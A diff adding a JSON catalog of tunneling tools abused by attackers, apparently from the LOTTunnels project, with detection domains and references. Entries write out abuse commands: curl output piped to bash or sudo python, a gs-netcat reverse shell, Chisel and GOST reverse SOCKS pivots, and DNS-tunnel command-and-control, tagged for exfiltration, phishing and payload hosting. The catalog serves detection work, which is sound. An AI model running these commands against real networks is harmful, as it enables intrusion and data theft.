@@ -1,0 +1,3542 @@
+[
+  {
+    "Name": "Beeceptor",
+    "Description": "The Beeceptor CLI is a developer tool to help you connect the localhost port with Beeceptor's public endpoint. It is easy to install, and works on all platforms (macOS, Windows, and Linux). The Beeceptor CLI can be installed using NPM or downloaded as an independent executable file.",
+    "Author": "Kirill Magaskin",
+    "Created": "2025-02-15",
+    "Commands": [
+      {
+        "Command": "beeceptor-cli -p <PORT> [--https] [--headless]",
+        "Description": "This is quick way to start the beeceptor and connect local PORT to internet domain. After running this command you'll be required to authorize in browser on target host. Use --headless to print AuthToken and authorize on source host. This tool by default uses HTTP, for HTTPS check --https option.",
+        "Usecase": "Quick execution of beeceptor.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Quick Start/Installed version of beeceptor, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.beeceptor.com"
+      },
+      {
+        "Command": "Execution of the binary and/or with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://beeceptor.com/docs/local-tunneling-by-exposing-service-port/?ref=landing-page"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kirill Magaskin",
+        "Handle": "@k1rpi7ch"
+      }
+    ],
+    "source_file": "beeceptor.md",
+    "url": "https://lottunnels.github.io/lottunnels/beeceptor"
+  },
+  {
+    "Name": "Bore",
+    "Description": "Bore is a modern, simple TCP tunnel in Rust that exposes local ports to a remote server, bypassing standard NAT connection firewalls.",
+    "Author": "Kirill Magaskin",
+    "Created": "2025-02-15",
+    "Commands": [
+      {
+        "Command": "bore local <PORT> --to bore.pub",
+        "Description": "This is quick way to start the bore and connect local PORT to the public internet at bore.pub:<PORT>, where the port number is assigned randomly.",
+        "Usecase": "Quick execution of bore.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Quick Start/Installed version of bore, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "bore.pub:*"
+      },
+      {
+        "Command": "Execution of the binary and/or with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/ekzhang/bore"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kirill Magaskin",
+        "Handle": "@k1rpi7ch"
+      }
+    ],
+    "source_file": "bore.md",
+    "url": "https://lottunnels.github.io/lottunnels/bore"
+  },
+  {
+    "Name": "BTunnels",
+    "Description": "Broken Tunnels enables insiders as well as threat actors to expose local ports, local file system, local application over the internet via btunnels dynamic tunnel URLs.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-05",
+    "Commands": [
+      {
+        "Command": "btunnel.exe file --key <API-KEY>",
+        "Description": "This will generate tunnels link while exposing the local filesystem as a Directory Listing.",
+        "Usecase": "Exposing file system over the internet.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "btunnel.exe http --key <API-KEY>",
+        "Description": "This will generate tunnels link binding it to the local service running on the provided port. Can be used to expose local services, web applications and local files etc.",
+        "Usecase": "Exposing local services, ports, web applications etc. over the internet.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "btunnel.exe http --key <API-KEY>",
+        "Description": "By simply hosting a phishing website locally, it is possible to expose it via BTunnels Domain.",
+        "Usecase": "Hosting phishing sites locally and exposing them via BTunnels URLs.",
+        "Category": "Phishing",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "btunnel.exe http --key <API-KEY>",
+        "Description": "By simply hosting a malicious binaries/payloads locally it is possible to expose them via BTunnels domains.",
+        "Usecase": "Hosting malicious binaies/payloads locally and exposing them via BTunnels URLs.",
+        "Category": "Download",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Downloaded version of Btunnels, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.btunnel.co.in"
+      },
+      {
+        "Domain": "*.btunnel.in"
+      },
+      {
+        "Sigma": "https://github.com/search?q=repo%3ASigmaHQ%2Fsigma+9e02c8ec-02b9-43e8-81eb-34a475ba7965&type=code"
+      },
+      {
+        "Command": "Execution of the binary and/or with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://valhalla.nextron-systems.com/info/sigma-rule/9501f8e6-8e3d-48fc-a8a6-1089dd5d7ef4"
+      },
+      {
+        "Link": "https://defr0ggy.github.io/research/Utilizing-BTunnel-For-Data-Exfiltration/"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "btunnels.md",
+    "url": "https://lottunnels.github.io/lottunnels/btunnels"
+  },
+  {
+    "Name": "Burrow",
+    "Description": "Burrow is subscription based tool which enables local services/applications to be exposed over the internet. Insiders as well as threat actors can use this tool to perform variety of malicious tasks. Although, the tool requires an authentication token of which free token can be obtained from the website. The tunnels are required to be created from the dashboard first which generates a command to be executed locally onto the system to bind the service/port to the burrow tunnels.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-14",
+    "Commands": [
+      {
+        "Command": "curl -Ls https://burrow.io/<RANDOM> | bash -s",
+        "Description": "The URLs generated can be binded to a locally hosting services via bash.",
+        "Usecase": "Binding the local machine to the externally generated burrow tunnels.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Execution of bash with burrow tunnels."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.burrow.io"
+      },
+      {
+        "Domain": "*.burrow.link"
+      },
+      {
+        "Domain": "io.burrow.link:*"
+      },
+      {
+        "Command": "Execution of bash with burrow tunnels."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://burrow.io/"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "burrow.md",
+    "url": "https://lottunnels.github.io/lottunnels/burrow"
+  },
+  {
+    "Name": "Chisel",
+    "Description": "Chisel is a self-hosted, fast TCP/UDP tunnel transported over HTTP and secured via SSH, bundled in a single executable that acts as both client and server. Because the server is operator-run, there is no vendor domain to block. It is heavily abused for pivoting, SOCKS proxying and port forwarding, observed with Sandworm/APT44, Seedworm, PYSA (ChaChi) and Mespinoza, among many others.",
+    "Author": "cyberbuff",
+    "Created": "2026-09-17",
+    "Commands": [
+      {
+        "Command": "chisel server -p 8080 --reverse",
+        "Description": "Starts the operator-controlled Chisel server, listening for clients and permitting reverse port forwards initiated from compromised hosts.",
+        "Usecase": "Standing up the tunnel endpoint that compromised hosts connect back to.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "chisel client <SERVER>:8080 R:socks",
+        "Description": "Connects a compromised host back to the Chisel server and opens a reverse SOCKS proxy, giving the operator SOCKS access into the victim network.",
+        "Usecase": "Establishing a SOCKS pivot into an internal network.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "chisel client <SERVER>:8080 R:3389:127.0.0.1:3389",
+        "Description": "Reverse-forwards a public port on the Chisel server to a local service such as RDP on the compromised host, exposing it to the operator.",
+        "Usecase": "Reaching an internal service such as RDP through the tunnel.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Path": "Downloaded/Installed chisel binary (single executable acting as client and server), executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Command": "Execution of the chisel binary with client/server subcommands, especially the R: reverse forward and socks arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/jpillora/chisel"
+      },
+      {
+        "Link": "https://services.google.com/fh/files/misc/apt44-unearthing-sandworm.pdf"
+      }
+    ],
+    "source_file": "chisel.md",
+    "url": "https://lottunnels.github.io/lottunnels/chisel"
+  },
+  {
+    "Name": "Cloudflared",
+    "Description": "Cloudflared is provided by CloudFlare which is a cyber security company. This tool works in a similar fashion to others and allows insiders as well as threat actors for data exfiltration. Formerly was named Argo Tunnel.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-05",
+    "Commands": [
+      {
+        "Command": "cloudflared.exe tunnel --url <IP>:<PORT>",
+        "Description": "This will generate tunnels link. However, a local server on the same port is required to exfiltrate the data.",
+        "Usecase": "Exposing local file system over the internet.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "cloudflared.exe tunnel --url <IP>:<PORT>",
+        "Description": "By hosting a local server running a Phishing Website it is possible to expose it via CloudFlare URLs/Domains.",
+        "Usecase": "Hosting phishing sites locally and exposing them via CloudFlare URLs.",
+        "Category": "Phishing",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "cloudflared.exe tunnel --url <IP>:<PORT>",
+        "Description": "By simply hosting malicious binaries/payloads, it is possible to expose them via CloudFlare domains.",
+        "Usecase": "Hosting malicious binaies/payloads locally and exposing them via CloudFlare URLs.",
+        "Category": "Download",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Downloaded version of cloudflared, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.trycloudflare.com"
+      },
+      {
+        "Domain": "*.cfargotunnel.com"
+      },
+      {
+        "Domain": "*.cftunnel.com"
+      },
+      {
+        "Command": "Execution of the binary and/or with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://defr0ggy.github.io/research/Abusing-Cloudflared-A-Proxy-Service-To-Host-&-Share-Apps/"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      },
+      {
+        "Person": "Kirill Magaskin",
+        "Handle": "@k1rpi7ch"
+      }
+    ],
+    "source_file": "cloudflared.md",
+    "url": "https://lottunnels.github.io/lottunnels/cloudflared"
+  },
+  {
+    "Name": "Dataplicity",
+    "Description": "Dataplicity is free/subscription based tool which enables connecting local systems to dataplicity cloud for remotely accessing them over the internet.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-14",
+    "Commands": [
+      {
+        "Command": "curl -s https://www.dataplicity.com/<TOKEN>.py | sudo python",
+        "Description": "Having an account created on the website, it is possible to connect any system to the Dataplicity cloud and access it remotely, keeping shell-access.",
+        "Usecase": "Connecting the user machine to dataplicity cloud for shell-access/remote-access.",
+        "Category": "shell-access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "curl -s https://www.dataplicity.com/<TOKEN>.py | sudo python",
+        "Description": "Having an account created on the website, it is possible to connect any system to the Dataplicity cloud and access it remotely, for data exfiltration.",
+        "Usecase": "Connecting the user machine to dataplicity cloud for data exfiltration.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Execution of dapalicity python module from anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.dataplicity.com"
+      },
+      {
+        "Command": "Execution of the command."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://www.dataplicity.com/"
+      },
+      {
+        "Link": "https://github.com/wildfoundry/dataplicity-agent"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "dataplicity.md",
+    "url": "https://lottunnels.github.io/lottunnels/dataplicity"
+  },
+  {
+    "Name": "Dev Tunnels",
+    "Description": "Dev Tunnels enables insiders as well as threat actors to expose local ports over the internet via Microsoft dev tunnels.",
+    "Author": "Pure-Nomad",
+    "Created": "2024-10-05",
+    "Commands": [
+      {
+        "Command": "devtunnel host -p 3389",
+        "Description": "This will generate a dev tunnel binding it to the local service running on the provided port. Can be used to expose local services, web applications and local files etc.",
+        "Usecase": "Exposing local services, ports, web applications etc. over the internet.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "devtunnel echo http -p 8080",
+        "Description": "By simply hosting a phishing website locally, it is possible to expose it via a Microsoft Domain.",
+        "Usecase": "Hosting malicious binaries/payloads locally and exposing them via Dev Tunnel URLs.",
+        "Category": "Phishing",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Downloaded version of Dev Tunnels, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.devtunnels.ms"
+      },
+      {
+        "Domain": "*.data.rel.tunnels.api.visualstudio.com"
+      },
+      {
+        "Domain": "*.rel.tunnels.api.visualstudio.com"
+      },
+      {
+        "Domain": "*.global.rel.tunnels.api.visualstudio.com"
+      },
+      {
+        "Command": "Execution of the binary and/or with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/get-started?tabs=windows"
+      },
+      {
+        "Link": "https://www.youtube.com/watch?v=jNgFmAY20wY"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Ergo Proxy",
+        "Handle": "@_erg0sum"
+      },
+      {
+        "Person": "Brian Almond",
+        "Handle": "@BriPwn"
+      }
+    ],
+    "source_file": "devtunnels.md",
+    "url": "https://lottunnels.github.io/lottunnels/devtunnels"
+  },
+  {
+    "Name": "dnscat2",
+    "Description": "dnscat2 is a self-hosted tool that creates an encrypted command-and-control channel over the DNS protocol, tunnelling traffic through queries (TXT, MX, CNAME, A) so it survives in networks where only DNS leaves. The operator runs the Ruby server on an authoritative domain and the compromised host runs the C client, which provides a remote shell, port forwarding and file transfer over the tunnel. Because the operator controls the authoritative name server, blocking relies on the binary and DNS-tunneling signal rather than a fixed vendor domain. It is abused for covert C2, observed with the Silence APT and the Symbiote Linux threat, among others.",
+    "Author": "cyberbuff",
+    "Created": "2026-09-22",
+    "Commands": [
+      {
+        "Command": "ruby dnscat2.rb <TUNNEL_DOMAIN>",
+        "Description": "Starts the operator-controlled dnscat2 server, listening for clients tunnelling through the authoritative domain and exposing an interactive multi-session console.",
+        "Usecase": "Standing up the DNS C2 endpoint on a domain the operator controls.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Linux, MacOS, BSD"
+      },
+      {
+        "Command": "./dnscat2 --secret <SECRET> <TUNNEL_DOMAIN>",
+        "Description": "Runs the client on a compromised host, establishing an encrypted DNS tunnel to the server for a remote shell, port forwarding or file transfer (--dns server=<ip>,port=53 dials a resolver directly).",
+        "Usecase": "Covert command-and-control, tunnelling and exfiltration out of a network that only permits DNS.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS, BSD"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Path": "dnscat2.rb Ruby server on the operator's authoritative name server and the compiled dnscat2 C client on the compromised host."
+      }
+    ],
+    "Detection": [
+      {
+        "Command": "Execution of the dnscat2 client or dnscat2.rb server, and anomalous DNS traffic consistent with encrypted DNS tunneling (high-entropy TXT/MX/CNAME query and response volume to a single domain)."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/iagox86/dnscat2"
+      },
+      {
+        "Link": "https://www.activecountermeasures.com/malware-of-the-day-dnscat2-dns-tunneling/"
+      }
+    ],
+    "source_file": "dnscat2.md",
+    "url": "https://lottunnels.github.io/lottunnels/dnscat2"
+  },
+  {
+    "Name": "Expose.sh",
+    "Description": "EXPOSE is your new favourite open source tool for exposing your local services on the public Internet.",
+    "Author": "Kirill Magaskin",
+    "Created": "2025-02-15",
+    "Commands": [
+      {
+        "Command": "ssh -R 1:127.0.0.1:<PORT> expose.sh",
+        "Description": "This is quick way to start the localhost.run and connect local PORT to internet domain. By default, authentication is done by using the public SSH keys you have on your GitHub account. If you use a different username on your computer than the one you use on GitHub, add the GitHub username to your SSH command (use [USERNAME]@expose.sh instead of expose.sh)",
+        "Usecase": "Quick execution of expose.sh.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "expose.sh"
+      },
+      {
+        "Domain": "*.expos.es"
+      },
+      {
+        "Command": "Execution of ssh with \"expose.sh\" argument."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/exposesh"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kirill Magaskin",
+        "Handle": "@k1rpi7ch"
+      }
+    ],
+    "source_file": "exposesh.md",
+    "url": "https://lottunnels.github.io/lottunnels/exposesh"
+  },
+  {
+    "Name": "frp",
+    "Description": "frp (Fast Reverse Proxy) is a self-hosted reverse proxy that exposes local HTTP, TCP and UDP services behind NAT or a firewall to the internet through an attacker-controlled frps server. Because both the frps server and frpc client are operator-run, there is no vendor domain to block. It is one of the most widely abused tunneling tools in real intrusions, observed with Volt Typhoon/VOLTZITE, Cobalt Mirage, LightBasin and BIOPASS RAT, and is called out in the NSA/CISA \"Living off the Land\" guidance.",
+    "Author": "cyberbuff",
+    "Created": "2026-09-17",
+    "Commands": [
+      {
+        "Command": "frpc -c frpc.ini",
+        "Description": "Starts the frp client using an frpc.ini/frpc.toml configuration that points at an operator-controlled frps server, exposing configured local services through it.",
+        "Usecase": "Quick execution of frp to expose local services through a remote frps server.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "frpc tcp --server-addr <FRPS_IP> --server-port 7000 --local-port 22 --remote-port 6000",
+        "Description": "Forwards a public port (6000) on the frps server to a local service such as SSH (22), giving remote access to a host behind NAT or a firewall.",
+        "Usecase": "Maintaining remote access to an internal host.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "frpc stcp --role visitor --server-addr <FRPS_IP> --sk <SECRET>",
+        "Description": "Connects to a secret TCP (stcp) tunnel published by another frpc client via the shared frps server, reaching an internal service without opening a public port.",
+        "Usecase": "Reaching an internal service through a private frp tunnel.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Path": "Downloaded/Installed frpc (client) and frps (server) binaries, executed anywhere on the system, typically with an frpc.ini/frpc.toml configuration file."
+      }
+    ],
+    "Detection": [
+      {
+        "Command": "Execution of the frpc or frps binaries, presence of frpc.ini/frpc.toml/frps.ini configuration files, or the default frps control port 7000."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/fatedier/frp"
+      },
+      {
+        "Link": "https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF"
+      },
+      {
+        "Link": "https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf"
+      },
+      {
+        "Link": "https://hub.dragos.com/hubfs/116-Datasheets/Dragos_IntelBrief_VOLTZITE_FINAL.pdf"
+      }
+    ],
+    "source_file": "frp.md",
+    "url": "https://lottunnels.github.io/lottunnels/frp"
+  },
+  {
+    "Name": "goshs",
+    "Description": "goshs is a simple, single-binary HTTP file server written in Go. It has a built-in tunnel option that publishes the served directory to the internet through the localhost.run service, without any account or additional client.",
+    "Author": "Kamran Saifullah",
+    "Created": "2026-10-27",
+    "Commands": [
+      {
+        "Command": "goshs --tunnel",
+        "Description": "Starts goshs and exposes the served directory through a localhost.run tunnel. goshs logs a public URL on a random lhr.life subdomain that anyone with the link can reach. TLS (-s) must not be used since the tunnel requires plaintext. Short form is \"goshs -t\".",
+        "Usecase": "Exposing a local file server to the internet for file download, upload or exfiltration without installing a separate tunneling client.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": false,
+    "Full_Path": [
+      {
+        "Filename": "goshs"
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.lhr.life"
+      },
+      {
+        "Domain": "*.localhost.run"
+      },
+      {
+        "Command": "Execution of goshs with \"--tunnel\" or \"-t\" argument."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://docs.goshs.de/usage/tunnel/index.html"
+      },
+      {
+        "Link": "https://github.com/patrickhener/goshs"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "goshs.md",
+    "url": "https://lottunnels.github.io/lottunnels/goshs"
+  },
+  {
+    "Name": "GOST",
+    "Description": "GOST (GO Simple Tunnel) is a self-hosted, multi-protocol tunneling and proxy tool bundled in a single Go executable that acts as both client and server. It supports SOCKS5/HTTP proxying, TCP/UDP port forwarding and chained (multi-hop) tunnels over transports such as TLS, WebSocket, KCP and QUIC. Because the relay server is operator-run, there is no vendor domain to block. It is heavily abused for pivoting and C2 relaying, observed with Cadet Blizzard/APT44, MirrorFace, Hydrochasma and BlackCat/BlackMatter ransomware, and is named in CISA advisories on Russian military cyber actors.",
+    "Author": "cyberbuff",
+    "Created": "2026-09-17",
+    "Commands": [
+      {
+        "Command": "gost -L=:8080",
+        "Description": "Starts a local proxy listener (SOCKS5/HTTP auto-detected) on port 8080, providing a proxy entry point into the network from the host.",
+        "Usecase": "Standing up a proxy pivot on a compromised host.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "gost -L=rtcp://:6000/127.0.0.1:22",
+        "Description": "Publishes a remote TCP forward so that connections to port 6000 on the GOST server are forwarded to a local service such as SSH (22), reaching a host behind NAT or a firewall.",
+        "Usecase": "Reaching an internal service through a reverse tunnel.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "gost -L=socks5://:1080 -F=relay+tls://<SERVER>:443",
+        "Description": "Runs a local SOCKS5 proxy that chains outbound through an operator-controlled GOST relay over TLS, tunneling traffic to blend with ordinary HTTPS and bypass egress controls.",
+        "Usecase": "Establishing a chained SOCKS pivot to an operator-controlled relay.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Path": "Downloaded/Installed gost binary (single executable acting as client and server), executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Command": "Execution of the gost binary, particularly with -L listen and -F forward-chain arguments (e.g. rtcp://, relay+tls://, socks5://)."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/ginuerzh/gost"
+      },
+      {
+        "Link": "https://www.microsoft.com/en-us/security/blog/2023/06/14/cadet-blizzard-emerges-as-a-novel-and-distinct-russian-threat-actor/"
+      },
+      {
+        "Link": "https://blogs.jpcert.or.jp/en/2024/07/mirrorface-attack-against-japanese-organisations.html"
+      },
+      {
+        "Link": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/hydrochasma-asia-medical-shipping-intelligence-gathering"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "cyberbuff"
+      }
+    ],
+    "source_file": "gost.md",
+    "url": "https://lottunnels.github.io/lottunnels/gost"
+  },
+  {
+    "Name": "Gsocket",
+    "Description": "The Global Socket Toolkit (gsocket) allows two hosts behind NAT/Firewall to establish an encrypted TCP connection with each other through the Global Socket Relay Network (GSRN), using tools like gs-netcat and gsocket. Can be abused for reverse shells, port forwarding, SOCKS proxying and data exfiltration.",
+    "Author": "THC (The Hacker's Choice)",
+    "Created": "2026-08-17",
+    "Commands": [
+      {
+        "Command": "gs-netcat -s MySecret -l -i",
+        "Description": "Server-side of a reverse PTY shell. Spawns a true interactive login shell when a client connects using the same secret.",
+        "Usecase": "Interactive reverse shell access to a host behind NAT/firewall.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Linux, MacOS, BSD, Windows (gs-netcat client)"
+      },
+      {
+        "Command": "gs-netcat -s MySecret -i",
+        "Description": "Client-side connection to the gs-netcat listening server, giving a real interactive PTY shell.",
+        "Usecase": "Connecting to a reverse shell hosted behind NAT/firewall.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Linux, MacOS, BSD, Windows"
+      },
+      {
+        "Command": "gs-netcat -s MySecret -l -d 192.168.6.7 -p 22",
+        "Description": "Port-forwards connections arriving on the client's specified port to 192.168.6.7:22 on the server's private network.",
+        "Usecase": "Reach an internal host/service on a NAT'd network.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Linux, MacOS, BSD, Windows"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Filename": "gs-netcat"
+      },
+      {
+        "Filename": "gsocket"
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.gsocket.io"
+      },
+      {
+        "Command": "Execution of gs-netcat/gsocket binaries, including with -s <secret>, -l, -i or -e arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://www.gsocket.io/"
+      },
+      {
+        "Link": "https://github.com/hackerschoice/gsocket"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Jeffrey Tigchelaar-Moerbeek"
+      }
+    ],
+    "source_file": "gsocket.md",
+    "url": "https://lottunnels.github.io/lottunnels/gsocket"
+  },
+  {
+    "Name": "interactsh",
+    "Description": "An OOB interaction gathering server and client library which is used by Cyber Security Professionals but have an equal opportunity for the threat actors to abuse it for data exfiltration.",
+    "Author": "Kamran Saifullah",
+    "Created": "2026-08-16",
+    "Commands": [
+      {
+        "Command": "interactsh-client",
+        "Description": "An OOB interaction gathering server and client library which is used by Cyber Security Professionals but have an equal opportunity for the threat actors to abuse it for data exfiltration.",
+        "Usecase": "Data Exfiltration.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Quick Start/Installed version of interactsh, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.oast.pro"
+      },
+      {
+        "Domain": "*.oast.live"
+      },
+      {
+        "Domain": "*.oast.site"
+      },
+      {
+        "Domain": "*.oast.online"
+      },
+      {
+        "Domain": "*.oast.fun"
+      },
+      {
+        "Domain": "*.oast.me"
+      },
+      {
+        "Command": "Execution of the binary and/or with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/projectdiscovery/interactsh"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "interactsh.md",
+    "url": "https://lottunnels.github.io/lottunnels/interactsh"
+  },
+  {
+    "Name": "iodine",
+    "Description": "iodine is a self-hosted tool that tunnels IPv4 traffic through the DNS protocol, letting a compromised host reach the operator's server when only DNS queries leave the network. The operator runs the iodined server on an authoritative domain and the compromised host runs the iodine client, which encodes IP traffic inside DNS queries and responses. Because the operator controls the authoritative name server, blocking relies on the binary and DNS-tunneling signal rather than a fixed vendor domain. It is abused for covert C2 and exfiltration, observed with Winnti and Russian military (GRU) actors, among others.",
+    "Author": "cyberbuff",
+    "Created": "2026-09-22",
+    "Commands": [
+      {
+        "Command": "iodined -f -P <PASSWORD> 10.0.0.1 <TUNNEL_DOMAIN>",
+        "Description": "Starts the operator-controlled DNS tunnel server on an authoritative domain, assigning a tunnel subnet and requiring the shared password from clients.",
+        "Usecase": "Standing up the DNS tunnel endpoint on a domain the operator controls.",
+        "Category": "Access",
+        "Privileges": "Administrator",
+        "OperatingSystem": "Linux, MacOS, BSD, Windows"
+      },
+      {
+        "Command": "iodine -f -P <PASSWORD> <TUNNEL_DOMAIN>",
+        "Description": "Runs the client on a compromised host, tunnelling IPv4 traffic to the iodined server entirely inside DNS queries and responses via the local resolver.",
+        "Usecase": "Establishing covert C2 or exfiltration out of a network that only permits DNS.",
+        "Category": "Exfiltrate",
+        "Privileges": "Administrator",
+        "OperatingSystem": "Linux, MacOS, BSD, Windows"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Path": "iodined server binary on the operator's authoritative name server and iodine client binary on the compromised host."
+      }
+    ],
+    "Detection": [
+      {
+        "Command": "Execution of the iodine client or iodined server binaries, and anomalous DNS query volume/entropy consistent with IPv4-over-DNS tunneling (long encoded subdomain labels, NULL/TXT/CNAME query floods)."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/yarrick/iodine"
+      },
+      {
+        "Link": "https://unit42.paloaltonetworks.com/dns-tunneling-in-the-wild/"
+      }
+    ],
+    "source_file": "iodine.md",
+    "url": "https://lottunnels.github.io/lottunnels/iodine"
+  },
+  {
+    "Name": "iroh",
